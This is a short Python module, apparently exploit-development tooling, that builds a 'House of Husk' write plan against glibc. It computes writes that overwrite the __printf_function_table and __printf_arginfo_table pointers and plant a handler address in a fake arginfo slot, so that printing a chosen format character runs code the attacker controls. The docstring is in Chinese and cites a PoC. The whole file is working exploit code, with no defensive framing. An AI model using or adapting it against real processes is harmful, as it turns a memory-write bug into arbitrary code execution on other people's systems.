"""House of Husk printf handler table target plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or not 0 <= v < 1 << 64: raise ValueError("value must fit uint64")
    return v.to_bytes(8, "little")

def build_house_of_husk(*, printf_function_table_addr: int,
                        printf_arginfo_table_addr: int,
                        function_table_data_addr: int,
                        arginfo_table_data_addr: int,
                        format_char: int, handler_addr: int,
                        slot_bias: int = 2) -> tuple[MemoryWrite, ...]:
    """生成两张 printf handler 表的目标写入计划。

    printf_function_table_addr/printf_arginfo_table_addr: 目标 libc 全局表指针地址，必须按 Build ID 解析。
    function_table_data_addr/arginfo_table_data_addr: 两张伪表的实际可写地址。
    format_char: 被触发的格式字符 ASCII 值，例如 `ord('X')`。
    handler_addr: 伪表中对应槽位的回调地址。
    slot_bias: glibc 表索引偏移；按 PoC 默认是 2。
    """
    if not 0 <= format_char < 256 or slot_bias < 0: raise ValueError("invalid format character or bias")
    slot = format_char - slot_bias
    if slot < 0: raise ValueError("format character precedes table bias")
    arg_slot = arginfo_table_data_addr + slot * 8
    return (MemoryWrite(printf_function_table_addr, _p(function_table_data_addr), "__printf_function_table"),
            MemoryWrite(printf_arginfo_table_addr, _p(arginfo_table_data_addr), "__printf_arginfo_table"),
            MemoryWrite(arg_slot, _p(handler_addr), f"arginfo table slot {format_char:#x}"))
